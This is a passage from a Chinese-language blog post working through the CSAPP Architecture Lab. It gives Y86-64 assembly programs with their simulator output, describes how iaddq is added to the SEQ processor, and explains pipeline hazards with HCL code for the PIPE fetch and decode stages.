class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl">thz<span class="hljs-variable">@DESKTOP</span>-79OKEST:<span class="hljs-regexp">/mnt/d</span><span class="hljs-regexp">/cs_basci_labs/</span>CSAPP_labs/my_answer/archlab-handout/sim/misc$ ./yas sum.ys<br>thz<span class="hljs-variable">@DESKTOP</span>-79OKEST:<span class="hljs-regexp">/mnt/d</span><span class="hljs-regexp">/cs_basci_labs/</span>CSAPP_labs/my_answer/archlab-handout/sim/misc$ ./yis sum.yo<br>Stopped in <span class="hljs-number">36</span> steps at PC = <span class="hljs-number">0x13</span>.  Status <span class="hljs-string">&#x27;HLT&#x27;</span>, CC Z=<span class="hljs-number">1</span> S=<span class="hljs-number">0</span> O=<span class="hljs-number">0</span><br>Changes to registers:<br><span class="hljs-variable">%rax</span>:   <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000cba</span><br><span class="hljs-variable">%rsp</span>:   <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000200</span><br><span class="hljs-variable">%r8</span>:    <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000008</span><br><br>Changes to memory:<br><span class="hljs-number">0x01f0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x000000000000005b</span><br><span class="hljs-number">0x01f8</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000013</span><br></code></pre></td></tr></table></figure><h4 id="rsum-list"><a href="#rsum-list" class="headerlink" title="rsum_list"></a>rsum_list</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># Sample linked list</span><br>    .pos <span class="hljs-number">0</span><br>    irmovq stack,<span class="hljs-variable">%rsp</span><br>    call main<br>    halt<br><br>    .align <span class="hljs-number">8</span><br>ele1:<br>    .quad <span class="hljs-number">0x00a</span><br>    .quad ele2<br>ele2:<br>    .quad <span class="hljs-number">0x0b0</span><br>    .quad ele3<br>ele3:<br>    .quad <span class="hljs-number">0xc00</span><br>    .quad <span class="hljs-number">0</span><br><br>main:<br>    irmovq ele1,<span class="hljs-variable">%rdi</span><br>    call rsum_list<br>    ret<br><br>rsum_list:<br>    andq <span class="hljs-variable">%rdi</span>,<span class="hljs-variable">%rdi</span><br>    je <span class="hljs-keyword">if</span><br><br><span class="hljs-keyword">else</span>:<br>    pushq <span class="hljs-variable">%rbx</span><br>    mrmov<span class="hljs-string">q (<span class="hljs-variable">%rdi</span>)</span>,<span class="hljs-variable">%rbx</span><br>    irmovq <span class="hljs-variable">$8</span>,<span class="hljs-variable">%r8</span><br>    addq <span class="hljs-variable">%r8</span>,<span class="hljs-variable">%rdi</span><br>    mrmov<span class="hljs-string">q (<span class="hljs-variable">%rdi</span>)</span>,<span class="hljs-variable">%r8</span><br>    rrmovq <span class="hljs-variable">%r8</span>,<span class="hljs-variable">%rdi</span><br>    call rsum_list<br>    addq <span class="hljs-variable">%rbx</span>,<span class="hljs-variable">%rax</span><br>    popq <span class="hljs-variable">%rbx</span><br>    ret<br><br><span class="hljs-keyword">if</span>:<br>    irmovq <span class="hljs-variable">$0</span>,<span class="hljs-variable">%rax</span><br>    ret<br><br>    .pos <span class="hljs-number">0x2000</span><br>stack:<br></code></pre></td></tr></table></figure><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs dns">thz@DESKTOP-<span class="hljs-number">79</span>OKEST:/mnt/d/cs_basci_labs/CSAPP_labs/my_answer/archlab-handout/sim/misc$ ./yas rsum.ys<br>thz@DESKTOP-<span class="hljs-number">79</span>OKEST:/mnt/d/cs_basci_labs/CSAPP_labs/my_answer/archlab-handout/sim/misc$ ./yis rsum.yo<br>Stopped in <span class="hljs-number">46</span> steps at PC = <span class="hljs-number">0</span>x13.  Status &#x27;HLT&#x27;, CC Z=<span class="hljs-number">0</span> S=<span class="hljs-number">0</span> O=<span class="hljs-number">0</span><br>Changes to registers:<br>%rax:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x0000000000000cba<br>%rsp:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000002000</span><br><br>Changes to memory:<br><span class="hljs-number">0</span>x1fc0: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000094</span><br><span class="hljs-number">0</span>x1fc8: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x000000<span class="hljs-number">00000000b0</span><br><span class="hljs-number">0</span>x1fd0: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000094</span><br><span class="hljs-number">0</span>x1fd8: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x000000000000000a<br><span class="hljs-number">0</span>x1fe0: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000094</span><br><span class="hljs-number">0</span>x1ff0: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x000000000000005b<br><span class="hljs-number">0</span>x1ff8: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000013</span><br></code></pre></td></tr></table></figure><h4 id="copy"><a href="#copy" class="headerlink" title="copy"></a>copy</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># Sample linked list</span><br>    .pos <span class="hljs-number">0</span><br>    irmovq stack,<span class="hljs-variable">%rsp</span><br>    call main<br>    halt<br><br>    .align <span class="hljs-number">8</span><br><span class="hljs-comment"># Source block</span><br>src:<br>    .quad <span class="hljs-number">0x00a</span><br>    .quad <span class="hljs-number">0x0b0</span><br>    .quad <span class="hljs-number">0xc00</span><br><span class="hljs-comment"># Destination block</span><br>dest:<br>    .quad <span class="hljs-number">0x111</span><br>    .quad <span class="hljs-number">0x222</span><br>    .quad <span class="hljs-number">0x333</span><br><br>main:<br>    irmovq src,<span class="hljs-variable">%rdi</span><br>    irmovq dest,<span class="hljs-variable">%rsi</span><br>    irmovq <span class="hljs-variable">$3</span>,<span class="hljs-variable">%rdx</span><br>    irmovq <span class="hljs-variable">$8</span>,<span class="hljs-variable">%r9</span><br>    call copy_block<br>    ret<br><br>copy_block:<br>    irmovq <span class="hljs-variable">$0</span>,<span class="hljs-variable">%rax</span><br>    andq <span class="hljs-variable">%rdx</span>,<span class="hljs-variable">%rdx</span><br>    je end<br><br>loop:<br>    mrmov<span class="hljs-string">q (<span class="hljs-variable">%rdi</span>)</span>,<span class="hljs-variable">%r8</span><br>    xorq <span class="hljs-variable">%r8</span>,<span class="hljs-variable">%rax</span><br>    rmmovq <span class="hljs-variable">%r8</span>,(<span class="hljs-variable">%rsi</span>)<br>    addq <span class="hljs-variable">%r9</span>,<span class="hljs-variable">%rdi</span><br>    addq <span class="hljs-variable">%r9</span>,<span class="hljs-variable">%rsi</span><br>    irmovq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%r8</span><br>    subq <span class="hljs-variable">%r8</span>,<span class="hljs-variable">%rdx</span><br>    jne loop<br><br>end:<br>    ret<br><br>    .pos <span class="hljs-number">0x2000</span><br>stack:<br><br><br></code></pre></td></tr></table></figure><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs dns">thz@DESKTOP-<span class="hljs-number">79</span>OKEST:/mnt/d/cs_basci_labs/CSAPP_labs/my_answer/archlab-handout/sim/misc$ ./yas copy.ys<br>thz@DESKTOP-<span class="hljs-number">79</span>OKEST:/mnt/d/cs_basci_labs/CSAPP_labs/my_answer/archlab-handout/sim/misc$ ./yis copy.yo<br>Stopped in <span class="hljs-number">37</span> steps at PC = <span class="hljs-number">0</span>x13.  Status &#x27;HLT&#x27;, CC Z=<span class="hljs-number">1</span> S=<span class="hljs-number">0</span> O=<span class="hljs-number">0</span><br>Changes to registers:<br>%rax:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x0000000000000cba<br>%rsp:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000002000</span><br>%rsi:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000048</span><br>%rdi:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000030</span><br>%r8:    <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000001</span><br>%r9:    <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000008</span><br><br>Changes to memory:<br><span class="hljs-number">0</span>x0030: <span class="hljs-number">0</span>x0000<span class="hljs-number">000000000111</span>      <span class="hljs-number">0</span>x000000000000000a<br><span class="hljs-number">0</span>x0038: <span class="hljs-number">0</span>x0000<span class="hljs-number">000000000222</span>      <span class="hljs-number">0</span>x000000<span class="hljs-number">00000000b0</span><br><span class="hljs-number">0</span>x0040: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000333</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000c00</span><br><span class="hljs-number">0</span>x1ff0: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000079</span><br><span class="hljs-number">0</span>x1ff8: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000013</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;%rax的最终值为0xcba&#x3D;&#x3D;</p><h2 id="PartB"><a href="#PartB" class="headerlink" title="PartB"></a>PartB</h2><p>working in directory sim&#x2F;seq   </p><p>要求：modify the file seq-full.hcl,  extend the SEQ processor to support the iaddq  </p><h3 id="回顾指令被执行时需要的六个阶段"><a href="#回顾指令被执行时需要的六个阶段" class="headerlink" title="回顾指令被执行时需要的六个阶段"></a>回顾指令被执行时需要的六个阶段</h3><ul><li>取指：获取icode:ifun，获取rA:rB，valC，valP</li><li>译码：从寄存器文件获取valA,valB</li><li>执行：计算得到valE（要么是算数运算 逻辑运算 要么是计算内存地址[rmmovq rA,D(rB)] 要么是计算栈指针）；有时还设置条件码</li><li>访存：读（valM）或者是写内存</li><li>写回：写寄存器文件</li><li>更新PC</li></ul><h4 id="iaddq"><a href="#iaddq" class="headerlink" title="iaddq"></a>iaddq</h4><p>常数 IADDQ 的声明为C </p><p><code>iaddq  V,rB    //编码   C 0 F rB V</code></p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs haskell">//------------取指<span class="hljs-comment">--------</span><br><span class="hljs-title">icode</span>:fun &lt;- <span class="hljs-type">M</span>[<span class="hljs-type">PC</span>]<br><span class="hljs-title">rA</span>:rB &lt;- <span class="hljs-type">M</span>[<span class="hljs-type">PC</span>+<span class="hljs-number">1</span>]<br><span class="hljs-title">valC</span> &lt;- <span class="hljs-type">M</span>[<span class="hljs-type">PC</span>+<span class="hljs-number">2</span>]<br><span class="hljs-title">valP</span> -&lt;<span class="hljs-type">PC</span>+<span class="hljs-number">10</span><br>//------------译码<span class="hljs-comment">---------</span><br><span class="hljs-title">valB</span>&lt;- <span class="hljs-type">R</span>[rB]<br>//-----------执行<span class="hljs-comment">---------</span><br><span class="hljs-title">valE</span> &lt;- valB+valC<br><span class="hljs-title">set</span> <span class="hljs-type">CC</span><br>//------------访存<span class="hljs-comment">--------</span><br>//------------写回<span class="hljs-comment">--------</span><br><span class="hljs-type">R</span>[rB] &lt;- valE<br>//------------更新<span class="hljs-type">PC</span><span class="hljs-comment">------</span><br><span class="hljs-type">PC</span> &lt;- valP<br><br></code></pre></td></tr></table></figure><p>修改hcl文件比较简单，根据iaddq的执行阶段，在特定阶段的HCL语言加上IIADDQ即可</p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>然后按照下面要求进行测试</p><img src="./image/4,arch_lab_image/image-20240517174836445.png" alt="image-20240517174836445" style="zoom:67%;" /><img src="./image/4,arch_lab_image/image-20240517175307069.png" alt="image-20240517175307069" style="zoom:50%;" /><img src="./image/4,arch_lab_image/image-20240517175342519.png" alt="image-20240517175342519" style="zoom:50%;" /><img src="./image/4,arch_lab_image/image-20240517175211550.png" alt="image-20240517175211550" style="zoom:50%;" /><h2 id="PartC-得分52-60"><a href="#PartC-得分52-60" class="headerlink" title="PartC  得分52&#x2F;60"></a>PartC  得分52&#x2F;60</h2><h4 id="硬件结构"><a href="#硬件结构" class="headerlink" title="硬件结构"></a>硬件结构</h4><p>seq硬件结构如下：</p><p>一条指令执行完所有阶段之后，才执行下一条指令</p><p><img src="/project/./image/4,arch_lab_image/image-20240518150633063.png" alt="image-20240518150633063"></p><p>pipe硬件结构如下：</p><p>指令执行完一个阶段后，其状态放入下一个状态寄存器，该阶段的硬件交给下一条指令使用</p><p><img src="/project/./image/4,arch_lab_image/image-20240518150739343.png" alt="image-20240518150739343"></p><h4 id="Y86-64指令的顺序实现"><a href="#Y86-64指令的顺序实现" class="headerlink" title="Y86-64指令的顺序实现"></a>Y86-64指令的顺序实现</h4><img src="https://img-blog.csdnimg.cn/931d6d97b4214f29877ed56d35141e11.PNG?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASGFuaV85Nw==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="img" style="zoom: 80%;" /><p><img src="https://img-blog.csdnimg.cn/026c881ab1054018b02f189fa674a6f5.PNG?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASGFuaV85Nw==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/10c21f9c87654b7cb7a54731a882a61a.PNG?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASGFuaV85Nw==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="img"></p><img src="https://img-blog.csdnimg.cn/2c8d4ba8e36b4f008fda95de17f1f2f2.PNG?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASGFuaV85Nw==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="img" style="zoom:80%;" /><h4 id="PIPE需要注意的问题"><a href="#PIPE需要注意的问题" class="headerlink" title="PIPE需要注意的问题"></a>PIPE需要注意的问题</h4><h5 id="PC预测"><a href="#PC预测" class="headerlink" title="PC预测"></a>PC预测</h5><p>取指令阶段完成后，下一条指令是谁</p><p>大部分指令，pc是valP；jmp和call，pc是valC；</p><p>条件转移则需要预测；</p><p>ret的PC要在访存阶段之后才知道，策略是暂停处理新指令。</p><h5 id="流水线冒险"><a href="#流水线冒险" class="headerlink" title="流水线冒险"></a>流水线冒险</h5><h6 id="1，数据冒险"><a href="#1，数据冒险" class="headerlink" title="1，数据冒险"></a>1，数据冒险</h6><p>（当下条指令会用到当前指令的结果时；由于寄存器的译码和写回在不同阶段，寄存器会发生数据冒险）</p><p>处理策略：</p><ol><li><p>暂停</p><p>即将指令阻塞在当前阶段 （如译码阶段，等前面的指令执行完写回之后，才继续运行），方法是插入一个“bubble”，类似nop指令</p><p>缺点是严重降低了吞吐量</p></li><li><p>转发 </p><p>将需要的数据直接转发过来，而不是等之前的指令写回</p></li></ol><h6 id="2，转发不能解决-：加载-使用冒险"><a href="#2，转发不能解决-：加载-使用冒险" class="headerlink" title="2，转发不能解决 ：加载&#x2F;使用冒险"></a>2，转发不能解决 ：加载&#x2F;使用冒险</h6><p>​暂停和转发一起使用，这种方法叫做加载互锁，可以解决加载&#x2F;使用冒险</p><p>​转发和加载互锁可以解决所有数据冒险</p><h6 id="3，控制冒险"><a href="#3，控制冒险" class="headerlink" title="3，控制冒险"></a>3，控制冒险</h6><p>（在条件转移和ret时，可能发生控制冒险）</p><p>对于ret，其在访存阶段得到valM(PC)，利用bubble暂停后面的指令，等ret访存结束再取指令；</p><p>对于jxx，我们默认选择跳转分支，jxx在执行阶段结束后，我们会得到其cond，知道我们预测是否正确；若不正确，则bubble暂停后面的指令，然后取正确地址的指令</p><h4 id="PIPE实现"><a href="#PIPE实现" class="headerlink" title="PIPE实现"></a>PIPE实现</h4><h5 id="fetch"><a href="#fetch" class="headerlink" title="fetch"></a>fetch</h5><p><img src="/project/./image/4,arch_lab_image/image-20240518174345010.png" alt="image-20240518174345010"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment">## What address should instruction be fetched at</span><br><span class="hljs-comment"># 三个源 预测地址 ret返回的地址 预测错误时，jxx指令的下个地址</span><br><span class="hljs-string">word</span> <span class="hljs-string">f_pc</span> <span class="hljs-string">=</span> [<br><span class="hljs-comment"># Mispredicted branch.  Fetch at incremented PC</span><br><span class="hljs-string">M_icode</span> <span class="hljs-string">==</span> <span class="hljs-string">IJXX</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-type">!M_Cnd</span> <span class="hljs-string">:</span> <span class="hljs-string">M_valA;</span><br><span class="hljs-comment"># Completion of RET instruction</span><br><span class="hljs-string">W_icode</span> <span class="hljs-string">==</span> <span class="hljs-attr">IRET :</span> <span class="hljs-string">W_valM;</span><br><span class="hljs-comment"># Default: Use predicted value of PC</span><br><span class="hljs-attr">1 :</span> <span class="hljs-string">F_predPC;</span><br>]<span class="hljs-string">;</span><br><br><span class="hljs-comment"># Predict next value of PC</span><br><span class="hljs-comment"># 预测地址 两种                                                                                                                                                                                                                                                                           </span><br><span class="hljs-string">word</span> <span class="hljs-string">f_predPC</span> <span class="hljs-string">=</span> [<br><span class="hljs-string">f_icode</span> <span class="hljs-string">in</span> &#123; <span class="hljs-string">IJXX</span>, <span class="hljs-string">ICALL</span> &#125; <span class="hljs-string">:</span> <span class="hljs-string">f_valC;</span><br><span class="hljs-attr">1 :</span> <span class="hljs-string">f_valP;</span><br>]<span class="hljs-string">;</span><br><br><span class="hljs-comment"># Determine status code for fetched instruction</span><br><span class="hljs-string">word</span> <span class="hljs-string">f_stat</span> <span class="hljs-string">=</span> [<br><span class="hljs-attr">imem_error:</span> <span class="hljs-string">SADR;</span><br><span class="hljs-type">!instr_valid</span> <span class="hljs-string">:</span> <span class="hljs-string">SINS;</span><br><span class="hljs-string">f_icode</span> <span class="hljs-string">==</span> <span class="hljs-attr">IHALT :</span> <span class="hljs-string">SHLT;</span><br><span class="hljs-attr">1 :</span> <span class="hljs-string">SAOK;</span><br>]<span class="hljs-string">;</span><br></code></pre></td></tr></table></figure><h5 id="decode"><a href="#decode" class="headerlink" title="decode"></a>decode</h5><p><img src="/project/./image/4,arch_lab_image/image-20240518174358789.png" alt="image-20240518174358789"></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><br><span class="hljs-comment">################ Decode Stage ######################################</span><br><br><br><span class="hljs-comment">## What register should be used as the A source?</span><br><span class="hljs-string">word</span> <span class="hljs-string">d_srcA</span> <span class="hljs-string">=</span> [<br><span class="hljs-string">D_icode</span> <span class="hljs-string">in</span> &#123; <span class="hljs-string">IRRMOVQ</span>, <span class="hljs-string">IRMMOVQ</span>, <span class="hljs-string">IOPQ</span>, <span class="hljs-string">IPUSHQ</span>  &#125; <span class="hljs-string">:</span> <span class="hljs-string">D_rA;</span><br><span class="hljs-string">D_icode</span> <span class="hljs-string">in</span> &#123; <span class="hljs-string">IPOPQ</span>, <span class="hljs-string">IRET</span> &#125; <span class="hljs-string">:</span> <span class="hljs-string">RRSP;</span><br><span class="hljs-attr">1 :</span> <span class="hljs-string">RNONE;</span> <span class="hljs-comment"># Don&#x27;t need register</span><br>]<span class="hljs-string">;</span><br><br><span class="hljs-comment">## What register should be used as the B source?</span><br><span class="hljs-string">word</span> <span class="hljs-string">d_srcB</span> <span class="hljs-string">=</span> [<br><span class="hljs-string">D_icode</span> <span class="hljs-string">in</span> &#123; <span class="hljs-string">IOPQ</span>, <span class="hljs-string">IRMMOVQ</span>, <span class="hljs-string">IMRMOVQ</span>  &#125; <span class="hljs-string">:</span> <span class="hljs-string">D_rB;</span><br><span class="hljs-string">D_icode</span> <span class="hljs-string">in</span> &#123; <span class="hljs-string">IPUSHQ</span>, <span class="hljs-string">IPOPQ</span>, <span class="hljs-string">ICALL</span>, <span class="hljs-string">IRET</span> &#125; <span class="hljs-string">:</span> <span class="hljs-string">RRSP;</span><br><span class="hljs-attr">1 :</span> <span class="hljs-string">RNONE;</span>  <span class="hljs-comment"># Don&#x27;t need register</span><br>]<span class="hljs-string">;</span><br><br><span class="hljs-comment">## What register should be used as the E destination?</span><br><span class="hljs-string">word</span> <span class="hljs-string">d_dstE</span> <span class="hljs-string">=</span> [<br><span class="hljs-string">D_icode</span> <span class="hljs-string">in</span> &#123; <span class="hljs-string">IRRMOVQ</span>, <span class="hljs-string">IIRMOVQ</span>, <span class="hljs-string">IOPQ</span>&#125; <span class="hljs-string">:</span> <span class="hljs-string">D_rB;</span><br><span class="hljs-string">D_icode</span> <span class="hljs-string">in</span> &#123; <span class="hljs-string">IPUSHQ</span>, <span class="hljs-string">IPOPQ</span>, <span class="hljs-string">ICALL</span>, <span class="hljs-string">IRET</span> &#125; <span class="hljs-string">:</span> <span class="hljs-string">RRSP;</span><br><span class="hljs-attr">1 :</span> <span class="hljs-string">RNONE;</span>  <span class="hljs-comment"># Don&#x27;t write any register</span><br>]<span class="hljs-string">;</span><br><br><span class="hljs-comment">## What register should be used as the M destination?</span><br><span class="hljs-string">word</span> <span class="hljs-string">d_dstM</span> <span class="hljs-string">=</span> [<br><span class="hljs-string">D_icode</span> <span class="hljs-string">in</span> &#123; <span class="hljs-string">IMRMOVQ</span>, <span class="hljs-string">IPOPQ</span> &#125; <span class="hljs-string">:</span> <span class="hljs-string">D_rA;</span><br><span class="hljs-attr">1 :</span> <span class="hljs-string">RNONE;</span>  <span class="hljs-comment"># Don&#x27;t write any register</span><br>]<span class="hljs-string">;</span><br><br><br><span class="hljs-comment"># 下面的转发逻辑比较麻烦</span><br><span class="hljs-comment">## What should be the A value?</span><br><span class="hljs-comment">## Forward into decode stage for valA</span><br><span class="hljs-string">word</span> <span class="hljs-string">d_valA</span> <span class="hljs-string">=</span> [<br><span class="hljs-string">D_icode</span> <span class="hljs-string">in</span> &#123; <span class="hljs-string">ICALL</span>, <span class="hljs-string">IJXX</span> &#125; <span class="hljs-string">:</span> <span class="hljs-string">D_valP;</span> <span class="hljs-comment"># Use incremented PC    #select 合并信号valA和valP</span><br><span class="hljs-string">d_srcA</span> <span class="hljs-string">==</span> <span class="hljs-attr">e_dstE :</span> <span class="hljs-string">e_valE;</span>    <span class="hljs-comment"># Forward valE from execute</span><br><span class="hljs-string">d_srcA</span> <span class="hljs-string">==</span> <span class="hljs-attr">M_dstM :</span> <span class="hljs-string">m_valM;</span>    <span class="hljs-comment"># Forward valM from memory</span><br><span class="hljs-string">d_srcA</span> <span class="hljs-string">==</span> <span class="hljs-attr">M_dstE :</span> <span class="hljs-string">M_valE;</span>    <span class="hljs-comment"># Forward valE from memory</span><br><span class="hljs-string">d_srcA</span> <span class="hljs-string">==</span> <span class="hljs-attr">W_dstM :</span> <span class="hljs-string">W_valM;</span>    <span class="hljs-comment"># Forward valM from write back</span><br><span class="hljs-string">d_srcA</span> <span class="hljs-string">==</span> <span class="hljs-attr">W_dstE :</span> <span class="hljs-string">W_valE;</span>    <span class="hljs-comment"># Forward valE from write back</span><br><span class="hljs-attr">1 :</span> <span class="hljs-string">d_rvalA;</span>  <span class="hljs-comment"># Use value read from register file</span><br>]<span class="hljs-string">;</span><br><br><span class="hljs-string">word</span> <span class="hljs-string">d_valB</span> <span class="hljs-string">=</span> [<br><span class="hljs-string">d_srcB</span> <span class="hljs-string">==</span> <span class="hljs-attr">e_dstE :</span> <span class="hljs-string">e_valE;</span>    <span class="hljs-comment"># Forward valE from execute</span><br><span class="hljs-string">d_srcB</span> <span class="hljs-string">==</span> <span class="hljs-attr">M_dstM :</span> <span class="hljs-string">m_valM;</span>    <span class="hljs-comment"># Forward valM from memory</span><br><span 